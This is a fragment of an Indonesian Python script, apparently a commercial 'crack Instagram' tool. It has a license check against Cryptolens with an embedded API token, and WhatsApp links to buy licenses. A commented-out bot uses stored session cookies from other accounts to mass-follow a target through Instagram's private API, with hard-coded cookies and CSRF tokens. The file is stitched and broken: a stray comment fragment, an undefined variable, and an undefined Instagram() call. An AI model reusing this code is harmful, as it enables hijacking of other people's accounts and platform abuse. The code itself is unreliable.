#        delay = int(Console().input("[bold white]   ╰─>"))

#        print(Panel(f"""[white]Tunggu Sebentar, Sedang Menambahkan Followers Ke akun [italic red]{user}[/]""",style=f"{color_table}"))

#        for x in self.co:

#            uid = x.split("|")[0]

#            cok = x.split("|")[1]

#            self.Mulai_bot(xkn, uid, cok, delay)

#        prints(Panel("""[italic white]     Bot Followers Selesai""",style=f"{color_badge}"))

#

#    def delai(self, lay):

#        for sleep in range(lay, 0, -1):

#            time.sleep(1.0);Console().print(f"[bold white]╰─([bold green]Tunggu {sleep} Detik[bold white])          ", end = "\r")

#

#    def Mulai_bot(self, uid, nama, coki, delay):

#        try:

#            ses=requests.Session()

#            sesi = re.findall("sessionid=(.*?);", coki)[0]

#            head = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '0','content-type': 'application/x-www-form-urlencoded','cookie': 'ig_did=F839D900-5ECC-4392-BCAD-5CBD51FB9228; mid=YChlyQALAAHp2POOp2lK_-ciAGlM; ig_nrcb=1; csrftoken=W4fsZmCjUjFms6XmKl1OAjg8v81jZt3r; ds_user_id=45872034997; sessionid='+jnck,'origin': 'https://www.instagram.com','referer': 'https://www.instagram.com/','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': 'Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-A526B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/20.0 Chrome/106.0.5249.126 Mobile Safari/537.36 Instagram 84.0.0.21.105 Android (24/7.0; 380dpi; 1080x1920; OnePlus; ONEPLUS A3010; OnePlus3T; qcom; en_US; 145652094)','x-csrftoken': 'W4fsZmCjUjFms6XmKl1OAjg8v81jZt3r','x-ig-app-id': '5398218083','x-ig-www-claim': 'hmac.AR0OQY4Gw4kczWNvfVOhvoljSINqB2u2gB-utUQ1MF0Mkrzu','x-instagram-ajax': '95bfef5dd816','x-requested-with': 'XMLHttpRequest'}

#            response = json.loads(ses.post(f"https://i.instagram.com/api/v1/web/friendships/{uid}/follow/", headers=head).text)

#            if "ok" in str(response):

#                prints(Panel(f"""[bold white][[bold green]✔[bold white]] Status :[bold green] Sukses

#[bold white][[bold green]✔[bold white]] Nama   :[bold green] {nama}""",

def logoku():
    print("")
                                             
def key():
	os.system("clear");logoku();key = input(f" {H}•{N} masukan lisensi : {H}")
	try:ses = requests.Session();asu = ses.get("https://app.cryptolens.io/api/key/Activate?token=WyIzOTI1ODk2MSIsIjhaZ2dTUnJCWDB3cWwrb0xucG5LZFU5a0dLVWV4cWpPa2g5NHZCZGIiXQ==&ProductId=18999&Key=%s&Sign=True"%(key)).json()['licenseKey']['key'];open("data/lisensi.txt","w").write(key);prints(Panel(f"{P2}selamat lisensi yang anda masukan terdaftar ke server SIMPLY",width=80,padding=(0,6),style=f"{color_table}"));time.sleep(4);Instagram()
	except KeyError:
		prints(Panel(f"{P2}lisensi kamu sudah kedaluwarsa silahkan beli lisensi ke admin",width=80,padding=(0,6),style=f"{color_table}"));os.system("rm -rf data/lisensi.txt");os.system("xdg-open https://wa.me/+6285811169272?text=assalamualaikum+bang+mau+beli+lisensi+crack+Instagram");time.sleep(2);exit()

def cek():
	try:x=open("data/lisensi.txt","r").read()
	except FileNotFoundError:key()
	try:x = requests.get("https://app.cryptolens.io/api/key/Activate?token=WyIzOTI1ODk2MSIsIjhaZ2dTUnJCWDB3cWwrb0xucG5LZFU5a0dLVWV4cWpPa2g5NHZCZGIiXQ==&ProductId=18999&Key=%s&Sign=True"%(x)).json()['licenseKey']['key'];Instagram()
	except KeyError:
		prints(Panel(f"{P2}lisensi kamu sudah kedaluwarsa silahkan beli lisensi ke admin",width=80,padding=(0,6),style=f"{color_table}"));os.system("rm -rf data/lisensi.txt");os.system("xdg-open https://wa.me/+6283830108901?text=assalamualaikum+bang+mau+beli+lisensi+crack+Instagram");time.sleep(2);exit()

def beli_bang():
    prints(Panel(f"{P2}[{H2}01{P2}]. 1 minggu {H2}50.000 {P2}max pemakaian 1 device\n{P2}[{H2}02{P2}]. 1 bulan {H2}100.000{P2} max pemakaian 5 device\n{P2}[{H2}03{P2}]. open source full update {H2}450.000",width=80,padding=(0,15),style=f"{color_table}"))
    zxc = input(f" {H}•{N} pilih lisensi : {H}")
    if zxc in [""]:prints(f" {H2}•{P2} pilih yang bener broo jangan kosong");time.sleep(3);cek_lisensi_aktif()
    elif zxc in ["1","01"]:prints(f" {H2}•{P2} anda akan di arahkan ke WhatsApp");os.system("xdg-open https://wa.me/+6283830108901?text=assalamualaikum+bang+mau+beli+lisensi+Instagram+1+minggu");time.sleep(2);exit()
    elif zxc in ["2","02"]:prints(f" {H2}•{P2} anda akan di arahkan ke WhatsApp");os.system("xdg-open https://wa.me/+6283830108901?text=assalamualaikum+bang+mau+beli+lisensi+Instagram+1+bulan");time.sleep(2);exit()
    elif zxc in ["3","03"]:prints(f" {H2}•{P2} anda akan di arahkan ke WhatsApp");os.system("xdg-open https://wa.me/+6283830108901?text=assalamualaikum+bang+mau+beli+lisensi+Instagram+full+source");time.sleep(2);exit()
    else:prints(f" {H2}•{P2} ngetik apaan lu ngab");time.sleep(3);cek_lisensi_aktif()

def cek_lisensi_aktif():
	try:xz = open("data/lisensi.txt","r").read()
	except FileNotFoundError:key()
	os.system("clear");cek()

if __name__=="__main__":
	lisensiku.append("sukses")
	try:os.mkdir("result")
	except:pass
	try:os.mkdir("data")
	except:pass
	try:os.system("clear")
	except:pass
# white]] Nama   :[bold red] {nama}"""))

#                self.delai(delay)

#        except:

#            Console(width=35, style="bold purple3").print(Panel(f"""[bold white][[bold red]![bold white]] Status :[bold red] Gagal

#[bold white][[bold red]![bold white]] Nama   

Instagram()
